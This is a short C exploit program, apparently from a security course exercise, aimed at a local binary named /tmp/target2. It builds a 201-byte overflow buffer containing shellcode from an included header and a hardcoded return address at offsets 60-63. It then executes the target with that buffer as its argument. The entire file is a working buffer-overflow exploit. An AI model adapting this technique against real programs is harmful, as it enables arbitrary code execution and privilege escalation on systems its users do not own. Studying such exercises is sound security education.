#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

char payload[201];

void make_payload() {
  for (int i = 0; i < 201; i++) {
    payload[i] = 'A';
  }
  strncpy(payload + 64, shellcode, 46);
  // make sure my payload isn't cut short by the null terminator strncpy inserts
  payload[109] = 'A';

  payload[60] = 0x08;
  payload[61] = 0xfd;
  payload[62] = 0xff;
  payload[63] = 0xbf;
  
  payload[200] = 0x00;
}

int main(void) {
  char *args[] = { TARGET, payload, NULL };
  char *env[] = { NULL };
  make_payload();
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
